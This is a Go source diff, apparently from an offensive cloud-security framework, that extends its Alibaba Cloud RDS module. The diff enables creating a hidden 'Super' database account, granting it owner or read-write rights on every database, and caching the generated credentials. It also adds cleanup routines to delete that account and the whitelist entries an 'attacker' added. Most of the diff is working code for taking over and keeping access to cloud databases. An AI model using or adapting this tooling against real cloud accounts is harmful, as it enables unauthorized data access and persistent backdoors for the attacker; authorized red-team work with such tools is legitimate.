@@ -5,37 +5,103 @@ import (
 	"github.com/aliyun/alibaba-cloud-sdk-go/services/rds"
 	log "github.com/sirupsen/logrus"
 	"github.com/teamssix/cf/pkg/cloud"
-	// "github.com/teamssix/cf/pkg/util"
+	"github.com/teamssix/cf/pkg/util"
 	"github.com/teamssix/cf/pkg/util/cmdutil"
+	"github.com/teamssix/cf/pkg/util/database"
 	"github.com/AlecAivazis/survey/v2"
 	"fmt"
 	"sort"
 	"strings"
 )
 
-// func AddAccount(region string, specifiedDBInstanceID string, rdsAccount string) {
-// 	password := util.GenerateRandomPasswords()
-// 	request := rds.CreateCreateAccountRequest()
-// 	request.DBInstanceId = specifiedDBInstanceID
-// 	request.AccountName = rdsAccount
-// 	request.password = AccountPassword
-// 	request.AccountType = "Super"
-// 	request.Scheme = "https"
+func AddAccount(region string, specifiedDBInstanceID string, rdsAccount string, Engine string) {
+	password := util.GenerateRandomPasswords()
+	request := rds.CreateCreateAccountRequest()
+	request.DBInstanceId = specifiedDBInstanceID
+	request.AccountName = rdsAccount
+	request.AccountPassword = password
+	request.AccountType = "Super"
+	request.Scheme = "https"
 
-// 	_, err := RDSClient(region).CreateAccount(request)
-// 	if err != nil {
-// 		fmt.Println("创建失败，请检查是否具备 CreateAccount  权限或已存在同名用户 (Create failed, please check whether have AllocateInstancePublicConnection permissions or existing communications address)")
-// 		return
-// 	} else {
-// 		fmt.Println("创建成功，当前用户信息： (Creating an external address succeeded. Querying the current connection address)")
-// 		data := [][]string{
-// 			{rdsAccount, password},
-// 		}
-// 		var header = []string{"用户名 (User Name)", "密码 (Password)"}
-// 		var td = cloud.TableData{Header: header, Body: data}
-// 		cloud.PrintTable(td, "")
-// 	}
-// }
+	_, err := RDSClient(region).CreateAccount(request)
+	if err != nil {
+		fmt.Println("创建失败，请检查是否具备 CreateAccount 权限或已存在同名用户 (Create failed, please check whether have CreateAccount permissions or existing communications address)")
+		return
+	} else {
+		database.InsertTakeoverConsoleCache("alibabaRds", specifiedDBInstanceID, rdsAccount, password, "")
+		fmt.Println("创建成功，当前用户信息： (Creating an external address succeeded. Querying the current connection address)")
+		data := [][]string{
+			{rdsAccount, password},
+		}
+		var header = []string{"用户名 (User Name)", "密码 (Password)"}
+		var td = cloud.TableData{Header: header, Body: data}
+		cloud.PrintTable(td, "")
+
+		request := rds.CreateDescribeDatabasesRequest() //查询实例下数据库名称
+		request.Scheme = "https"
+		request.DBInstanceId = specifiedDBInstanceID
+		request.QueryParams["output"] = "cols=DBName,DBStatus,Engine rows=Databases.Database[]"
+		response, err := RDSClient(region).DescribeDatabases(request)
+		errutil.HandleErrNoExit(err)
+
+		if len(response.Databases.Database) > 0 {
+			var DBNames []string
+
+			for _, v := range response.Databases.Database {
+				DBNames = append(DBNames, v.DBName)
+			}
+
+			request := rds.CreateGrantAccountPrivilegeRequest()
+			request.Scheme = "https"
+			request.DBInstanceId = specifiedDBInstanceID
+			request.AccountName = rdsAccount
+
+			switch Engine {
+				case "MySQL":
+					fmt.Println("MySQL数据库无需对数据库具体授权，默认最高权限")
+					return
+				case "SQLServer":
+					request.AccountPrivilege = "DBOwner"
+				case "PostgreSQL":
+					request.AccountPrivilege = "DBOwner"
+				case "MariaDB":
+					request.AccountPrivilege = "ReadWrite"
+				default:
+					request.AccountPrivilege = "ReadWrite"
+			}
+
+			for _, v := range DBNames { //为此帐号对实例下所有数据库授予最高权限
+				request.DBName = v
+				RDSClient(region).GrantAccountPrivilege(request)
+			}
+
+			PrintDataBases(region, specifiedDBInstanceID)
+		}
+	}
+}
+
+func DeleteAccount(region string) {
+	TakeoverConsoleCache := database.SelectTakeoverConsoleCache("alibabaRds")
+	if len(TakeoverConsoleCache) == 0 {
+		log.Infoln("未创建过帐号，无需取消 (No create of the account, no need to cancel)")
+	} else {
+		specifiedDBInstanceID := TakeoverConsoleCache[0].PrimaryAccountID
+		userName := TakeoverConsoleCache[0].UserName
+
+		request := rds.CreateDeleteAccountRequest()
+		request.DBInstanceId = specifiedDBInstanceID
+		request.AccountName = userName
+		request.Scheme = "https"
+		_, err := RDSClient(region).DeleteAccount(request)
+		if err != nil {
+			fmt.Println("删除失败，请检查是否具备 DeleteAccount 权限 (Delete failed, please check whether have DeleteAccount permissions)")
+			return
+		} else {
+			database.DeleteTakeoverConsoleCache("alibabaRds")
+			fmt.Println("清理完成 (Clean up completed)")
+		}
+	}
+}
 
 
 func AddWhiteList(region string, specifiedDBInstanceID string, rdsWhiteList string) {
@@ -56,38 +122,22 @@ func AddWhiteList(region string, specifiedDBInstanceID string, rdsWhiteList stri
 		} else {
 			fmt.Println("追加成功，正在查询当前白名单 (Appended successfully and the current whitelist is being queried)")
 			PrintWhiteListInfo(region, specifiedDBInstanceID)
-
-			cleanWhiteList := []string{"Yes"}
-			var cleanWhiteListChoose string
-		    prompt := &survey.Select{
-		        Message: "删除添加的白名单地址？按下回车后，将会删除刚才已添加的白名单地址，请确保攻击已结束 (Delete the added whitelist address? Press Enter to delete the whitelist address you just added. Please ensure that the attack is over)",
-		        Options: cleanWhiteList,
-		    }
-		    survey.AskOne(prompt, &cleanWhiteListChoose)
-		    if cleanWhiteListChoose == "Yes" {
-		    	request.ModifyMode = "Delete"
-		    	_, err = RDSClient(region).ModifySecurityIps(request)
-		    	errutil.HandleErr(err)
-		    	fmt.Println("清理完成 (Clean up completed)")
-		    }
 		}
 	}
 }
 
-func CancelConnection(region string, specifiedDBInstanceID string, rdsConnectCancel string) {
-	request := rds.CreateReleaseInstancePublicConnectionRequest()
+func DeleteWhiteList(region string, specifiedDBInstanceID string, rdsWhiteListCancel string) {
+	request := rds.CreateModifySecurityIpsRequest()
 	request.Scheme = "https"
+	request.ModifyMode = "Delete"
 	request.DBInstanceId = specifiedDBInstanceID
-	request.CurrentConnectionString = rdsConnectCancel
-	_, err := RDSClient(region).ReleaseInstancePublicConnection(request)
-	if err != nil {
-		fmt.Println("关闭失败，请确认是否具备 ReleaseInstancePublicConnection 权限和地址是否正确 (Failed to shut down, please confirm whether have ReleaseInstancePublicConnection permissions and address is correct)")
-		return
-	} else {
-		fmt.Println("清理完成 (Clean up completed)")
-		PrintNetInfo(region, specifiedDBInstanceID)
-	}
+	request.SecurityIps = rdsWhiteListCancel
+
+	_, err := RDSClient(region).ModifySecurityIps(request)
+	errutil.HandleErrNoExit(err)
+	fmt.Println("清理完成 (Clean up completed)")
 }
+
 
 func CreateConnection(region string, specifiedDBInstanceID string, rdsConnect string, Engine string) {
 	request := rds.CreateAllocateInstancePublicConnectionRequest()
@@ -114,6 +164,44 @@ func CreateConnection(region string, specifiedDBInstanceID string, rdsConnect st
 	} else {
 		fmt.Println("创建外联地址成功，正在查询当前连接地址 (Creating an external address succeeded. Querying the current connection address)")
 		PrintNetInfo(region, specifiedDBInstanceID)
+	}
+}
+
+func CancelConnection(region string, specifiedDBInstanceID string, rdsConnectCancel string) {
+	request := rds.CreateReleaseInstancePublicConnectionRequest()
+	request.Scheme = "https"
+	request.DBInstanceId = specifiedDBInstanceID
+	request.CurrentConnectionString = rdsConnectCancel
+	_, err := RDSClient(region).ReleaseInstancePublicConnection(request)
+	if err != nil {
+		fmt.Println("关闭失败，请确认是否具备 ReleaseInstancePublicConnection 权限和地址是否正确 (Failed to shut down, please confirm whether have ReleaseInstancePublicConnection permissions and address is correct)")
+		return
+	} else {
+		fmt.Println("清理完成 (Clean up completed)")
+	}
+}
+
+func PrintDataBases(region string, specifiedDBInstanceID string) {
+	request := rds.CreateDescribeDatabasesRequest()
+	request.Scheme = "https"
+	request.DBInstanceId = specifiedDBInstanceID
+	request.QueryParams["output"] = "cols=DBName,DBStatus,Engine rows=Databases.Database[]"
+	response, err := RDSClient(region).DescribeDatabases(request)
+	errutil.HandleErrNoExit(err)
+
+	if len(response.Databases.Database) > 0 {
+		var data [][]string
+		for _, v := range response.Databases.Database {
+			privileges := make([]string, len(v.Accounts.AccountPrivilegeInfo))
+			for i, privilege := range v.Accounts.AccountPrivilegeInfo {
+				privileges[i] = privilege.Account + "(" + privilege.AccountPrivilege + ", " + privilege.AccountPrivilegeDetail + ")"
+			}
+			row := []string{v.DBName, strings.Join(privileges, ", ")}
+			data = append(data, row)
+		}
+		var header = []string{"数据库名 (DBName)", "授权情况 (privileges)"}
+		var td = cloud.TableData{Header: header, Body: data}
+		cloud.PrintTable(td, "")
 	}
 }
 
@@ -177,7 +265,7 @@ func PrintAccountInfo(region string, specifiedDBInstanceID string) {
 }
 
 
-func DBInstancesExec(region string, running bool, specifiedDBInstanceID string, engine string, lsFlushCache bool, rdsInfo bool, rdsConnect string, rdsConnectCancel string, rdsWhiteList string , rdsAccount string) {
+func DBInstancesExec(region string, running bool, specifiedDBInstanceID string, engine string, lsFlushCache bool, rdsInfo bool, rdsConnect string, rdsConnectCancel string, rdsWhiteList string , rdsWhiteListCancel, rdsAccount string ,rdsAccountCancel bool) {
 	var InstancesList []DBInstances
 	if lsFlushCache == false {
 		data := cmdutil.ReadRDSCache("alibaba")
@@ -271,7 +359,8 @@ func DBInstancesExec(region string, running bool, specifiedDBInstanceID string, 
 			if rdsInfo {
 				PrintNetInfo(region, specifiedDBInstanceID)
 				PrintWhiteListInfo(region, specifiedDBInstanceID)
-				PrintAccountInfo(region, specifiedDBInstanceID)			
+				PrintAccountInfo(region, specifiedDBInstanceID)
+				PrintDataBases(region, specifiedDBInstanceID)
 			}
 
 			if i.DBInstanceStatus == "Running"{
@@ -289,8 +378,19 @@ func DBInstancesExec(region string, running bool, specifiedDBInstanceID string, 
 				    }
 				} else if rdsWhiteList != "" {
 					AddWhiteList(region, specifiedDBInstanceID, rdsWhiteList)
+				} else if rdsWhiteListCancel != ""{
+					var isSure string
+					prompt := &survey.Input{
+				        Message: "警告：该方法应当用于删除攻击者创建的白名单地址，请勿用于删除原有的白名单地址，否则将造成不可逆的后果。如果已明确并确认要使用此方法，请键入Yes (Warning: This method should be used to delete the whitelisted address created by the attacker. Do not delete the original whitelisted address. Otherwise, irreversible consequences will be caused. If you are explicit and sure to use this method, type Yes)",
+				    }
+				    survey.AskOne(prompt, &isSure)
+				    if isSure == "Yes" {
+				    	DeleteWhiteList(region, specifiedDBInstanceID, rdsWhiteListCancel)
+				    }
 				} else if rdsAccount != "" {
-					fmt.Println("功能暂不可用")
+					AddAccount(region , specifiedDBInstanceID , rdsAccount, i.Engine)
+				} else if rdsAccountCancel {
+					DeleteAccount(region)
 				}
 			}
 		}
